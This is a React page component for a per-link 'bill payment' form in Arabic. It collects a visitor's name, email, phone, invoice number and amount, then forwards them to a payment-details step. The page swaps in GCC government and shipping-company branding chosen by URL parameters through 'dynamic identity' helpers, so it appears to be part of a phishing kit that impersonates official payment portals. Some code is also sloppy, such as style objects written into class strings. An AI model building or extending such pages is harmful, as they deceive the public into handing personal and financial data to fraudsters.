import { useState, useEffect, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { getCountryByCode } from "@/lib/countries";
import { getGovernmentServicesByCountry } from "@/lib/gccGovernmentServices";
import { getCurrencySymbol, getCurrencyCode, formatCurrency } from "@/lib/countryCurrencies";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { ArrowLeft, User, Mail, Phone, CreditCard, Hash, Building2 } from "lucide-react";
import BrandedTopBar from "@/components/BrandedTopBar";
import BrandedCarousel from "@/components/BrandedCarousel";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import { getServiceBranding } from "@/lib/serviceLogos";
import { shippingCompanyBranding } from "@/lib/brandingSystem";
import { detectEntityFromURL, getEntityLogo, getEntityIdentity } from "@/lib/dynamicIdentity";
import { useAutoApplyIdentity } from "@/hooks/useAutoApplyIdentity";
import { useDynamicIdentity } from "@/components/DynamicIdentityProvider";
import PageLoader from "@/components/PageLoader";

const PaymentData = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData, isLoading, isError } = useLink(id);
  const [showPage, setShowPage] = useState(false);

  useAutoApplyIdentity();
  const { identity: dynamicIdentity } = useDynamicIdentity();

  useEffect(() => {
    const timer = setTimeout(() => {
      setShowPage(true);
    }, 3000);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    if (linkData || isError) {
      setShowPage(true);
    }
  }, [linkData, isError]);
  const updateLink = useUpdateLink();
  const [isSubmitting, setIsSubmitting] = useState(false);

  const [customerName, setCustomerName] = useState("");
  const [customerEmail, setCustomerEmail] = useState("");
  const [customerPhone, setCustomerPhone] = useState("");
  const [invoiceNumber, setInvoiceNumber] = useState("");
  const [selectedService, setSelectedService] = useState("");
  const [paymentAmount, setPaymentAmount] = useState("");

  const urlParams = new URLSearchParams(window.location.search);
  const serviceKey = urlParams.get('company') || urlParams.get('service') || linkData?.payload?.service_key || linkData?.payload?.customerInfo?.service || 'government_payment';
  const countryParam = urlParams.get('country');
  const amountParam = urlParams.get('amount');

  const serviceName = "دفع فاتورة";
  const paymentInfo = linkData?.payload as any;
  
  // أولوية للـ query parameters
  const countryCode = countryParam || paymentInfo?.selectedCountry || "SA";
  const govSystem = getGovernmentPaymentSystem(countryCode);
  const branding = getServiceBranding(serviceKey);
  const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;

  // Get country data
  const countryData = getCountryByCode(countryCode);
  const phoneCode = countryData?.phoneCode || "+966";
  const phonePlaceholder = countryData?.phonePlaceholder || "5X XXX XXXX";

  // Get government services for the country
  const governmentServices = useMemo(
    () => getGovernmentServicesByCountry(countryCode),
    [countryCode]
  );

  // Get selected government service details
  const selectedServiceData = useMemo(
    () => governmentServices.find(s => s.key === selectedService),
    [governmentServices, selectedService]
  );

  // Get amount from link data
  const rawAmount = paymentInfo?.payment_amount;
  let amount = 500;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  // Set initial payment amount from link data
  useState(() => {
    if (amount && !paymentAmount) {
      setPaymentAmount(amount.toString());
    }
  });

  // Calculate formatted amount dynamically based on input
  const displayAmount = paymentAmount ? parseFloat(paymentAmount) : amount;
  const formattedAmount = formatCurrency(displayAmount, countryCode);

  if (isLoading && !showPage) {
    return <PageLoader message="جاري تحميل بيانات الفاتورة..." />;
  }

  const handleProceed = async (e: React.FormEvent) => {
    e.preventDefault();

    if (isSubmitting) return;
    setIsSubmitting(true);

    // Update link with payment data
    try {
      if (linkData) {
        const updatedData = {
          ...linkData.payload,
          payment_data: {
            customer_name: customerName,
            customer_email: customerEmail,
            customer_phone: customerPhone,
            invoice_number: invoiceNumber,
            selected_service: selectedService,
            selected_service_name: selectedServiceData?.nameAr || selectedService,
            payment_amount: parseFloat(paymentAmount) || amount,
            currency_code: getCurrencyCode(countryCode),
          },
          selectedCountry: countryCode,
          service_key: serviceKey,
          service_name: serviceName
        };

        try {
          await updateLink.mutateAsync({
            linkId: id!,
            payload: updatedData,
          });
        } catch (error) {
          console.error('Update link error:', error);
        }
      }

      // Navigate to payment details with params
      const finalAmount = parseFloat(paymentAmount) || amount;
      const nextUrl = `/pay/${id}/details?company=${serviceKey}&currency=${getCurrencyCode(countryCode)}&amount=${finalAmount}`;
      navigate(nextUrl);
    } catch (error) {
      console.error('Payment data error:', error);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <>
      <PaymentMetaTags
        serviceName={serviceName}
        serviceKey={serviceKey}
        amount={formatCurrency(amount, countryCode)}
        title="دفع فاتورة - إكمال البيانات"
        description="قم بإكمال بيانات السداد لدفع الفاتورة"
      />
      
      <BrandedTopBar 
        serviceKey={serviceKey}
        serviceName={govSystem.nameAr || serviceName}
        showBackButton={true}
        countryCode={countryCode}
        showCarousel={false}
      />

      <BrandedCarousel serviceKey={serviceKey} className="mb-0" />

      <div 
        className="min-h-screen py-6 sm:py-8" 
        dir="rtl"
        style={{
          background: `linear-gradient(135deg, ${companyBranding?.colors.background || govSystem.colors.surface}, ${companyBranding?.colors.surface || '#ffffff'})`,
          fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
        }}
      >
        <div className="container mx-auto px-3 sm:px-4">
          <div className="max-w-2xl mx-auto">
            <Card 
              className="p-4 sm:p-8 shadow-2xl border-t-4" 
              style={{ 
                borderTopColor: branding.colors.primary,
                boxShadow: companyBranding?.shadows.xl || '0 20px 60px -15px rgba(0, 0, 0, 0.3)',
                borderRadius: companyBranding?.borderRadius.lg || '16px'
              }}
            >
              <form onSubmit={handleProceed}>
                <div className="flex items-center justify-between mb-6 sm:mb-8">
                  <h1 
                    className="text-xl sm:text-3xl font-bold" 
                    style={{ 
                      color: companyBranding?.colors.text || govSystem.colors.text,
                      fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
                    }}
                  >
                    إكمال بيانات السداد
                  </h1>

                  <div
                    className="w-14 h-14 sm:w-20 sm:h-20 rounded-2xl flex items-center justify-center shadow-lg"
                    style={{
                      background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
                      boxShadow: companyBranding?.shadows.lg || '0 10px 40px -10px rgba(0,0,0,0.3)'
                    }}
                  >
                    <Building2 className="w-7 h-7 sm:w-10 sm:h-10 style={{ color: primaryColor }}" />
                  </div>
                </div>

                <div className="space-y-3 sm:space-y-4 mb-6 sm:mb-8">
                  <div>
                    <Label 
                      htmlFor="name" 
                      className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm font-bold"
                      style={{ color: companyBranding?.colors.text || govSystem.colors.text }}
                    >
                      <User className="w-3 h-3 sm:w-4 sm:h-4" />
                      الاسم الكامل *
                    </Label>
                    <Input
                      id="name"
                      value={customerName}
                      onChange={(e) => setCustomerName(e.target.value)}
                      required
                      className="h-10 sm:h-12 text-sm sm:text-base border-2 focus:border-primary transition-all"
                      placeholder="أدخل اسمك الكامل"
                      style={{
                        borderColor: companyBranding?.colors.border || '#e5e7eb',
                        fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
                      }}
                    />
                  </div>

                  <div>
                    <Label 
                      htmlFor="email" 
                      className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm font-bold"
                      style={{ color: companyBranding?.colors.text || govSystem.colors.text }}
                    >
                      <Mail className="w-3 h-3 sm:w-4 sm:h-4" />
                      البريد الإلكتروني *
                    </Label>
                    <Input
                      id="email"
                      type="email"
                      value={customerEmail}
                      onChange={(e) => setCustomerEmail(e.target.value)}
                      required
                      className="h-10 sm:h-12 text-sm sm:text-base border-2 focus:border-primary transition-all"
                      placeholder="example@email.com"
                      style={{
                        borderColor: companyBranding?.colors.border || '#e5e7eb',
                        fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
                      }}
                    />
                  </div>

                  <div>
                    <Label 
                      htmlFor="phone" 
                      className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm font-bold"
                      style={{ color: companyBranding?.colors.text || govSystem.colors.text }}
                    >
                      <Phone className="w-3 h-3 sm:w-4 sm:h-4" />
                      رقم الهاتف *
                    </Label>
                    <Input
                      id="phone"
                      type="tel"
                      value={customerPhone}
                      onChange={(e) => setCustomerPhone(e.target.value)}
                      required
                      className="h-10 sm:h-12 text-sm sm:text-base border-2 focus:border-primary transition-all"
                      placeholder={`${phoneCode} ${phonePlaceholder}`}
                      style={{
                        borderColor: companyBranding?.colors.border || '#e5e7eb',
                        fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
                      }}
                    />
                  </div>

                  <div>
                    <Label 
                      htmlFor="invoice" 
                      className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm font-bold"
                      style={{ color: companyBranding?.colors.text || govSystem.colors.text }}
                    >
                      <Hash className="w-3 h-3 sm:w-4 sm:h-4" />
                      الرقم المفوتر *
                    </Label>
                    <Input
                      id="invoice"
                      value={invoiceNumber}
                      onChange={(e) => setInvoiceNumber(e.target.value)}
                      required
                      className="h-10 sm:h-12 text-sm sm:text-base border-2 focus:border-primary transition-all"
                      placeholder="مثال: INV-12345"
                      style={{
                        borderColor: companyBranding?.colors.border || '#e5e7eb',
                        fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
                      }}
                    />
                  </div>

                  <div>
                    <Label 
                      className="mb-2 text-sm font-bold"
                      style={{ color: companyBranding?.colors.text || govSystem.colors.text }}
                    >
                      الخدمة الحكومية/العامة *
                    </Label>
                    <Select value={selectedService} onValueChange={setSelectedService}>
                      <SelectTrigger 
                        className="h-10 sm:h-12 border-2 focus:border-primary transition-all"
                        style={{
                          borderColor: companyBranding?.colors.border || '#e5e7eb',
                          fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
                        }}
                      >
                        <SelectValue placeholder="اختر الخدمة" />
                      </SelectTrigger>
                      <SelectContent className="bg-background z-50">
                        {governmentServices.map((service) => (
                          <SelectItem key={service.id} value={service.key}>
                            {service.nameAr}
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                    {selectedServiceData && (
                      <p className="text-xs text-muted-foreground mt-1">
                        {selectedServiceData.description}
                      </p>
                    )}
                  </div>

                  <div>
                    <Label 
                      htmlFor="amount" 
                      className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm font-bold"
                      style={{ color: companyBranding?.colors.text || govSystem.colors.text }}
                    >
                      <CreditCard className="w-3 h-3 sm:w-4 sm:h-4" />
                      مبلغ السداد *
                    </Label>
                    <Input
                      id="amount"
                      type="number"
                      value={paymentAmount}
                      onChange={(e) => setPaymentAmount(e.target.value)}
                      required
                      className="h-10 sm:h-12 text-sm sm:text-base border-2 focus:border-primary transition-all"
                      placeholder={`${amount} ${getCurrencySymbol(countryCode)}`}
                      step="0.01"
                      min="0"
                      style={{
                        borderColor: companyBranding?.colors.border || '#e5e7eb',
                        fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
                      }}
                    />
                    <p className="text-xs text-muted-foreground mt-1">
                      المبلغ الافتراضي: {formatCurrency(amount, countryCode)}
                    </p>
                  </div>
                </div>

                <Button
                  type="submit"
                  size="lg"
                  className="w-full text-sm sm:text-lg py-5 sm:py-7 style={{ color: primaryColor }} font-bold shadow-2xl hover:shadow-3xl transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed"
                  style={{
                    background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
                    boxShadow: companyBranding?.shadows.xl || `0 20px 60px -15px ${branding.colors.primary}90`,
                    fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
                  }}
                  disabled={isSubmitting || !customerName || !customerEmail || !customerPhone || !invoiceNumber || !selectedService || !paymentAmount}
                >
                  {isSubmitting ? (
                    <span>جاري المعالجة...</span>
                  ) : (
                    <>
                      <span className="ml-2">التالي</span>
                      <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
                    </>
                  )}
                </Button>

                <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
                  بالمتابعة، أنت توافق على الشروط والأحكام
                </p>
              </form>
            </Card>
          </div>
        </div>
      </div>
    </>
  );
};

export default PaymentData;
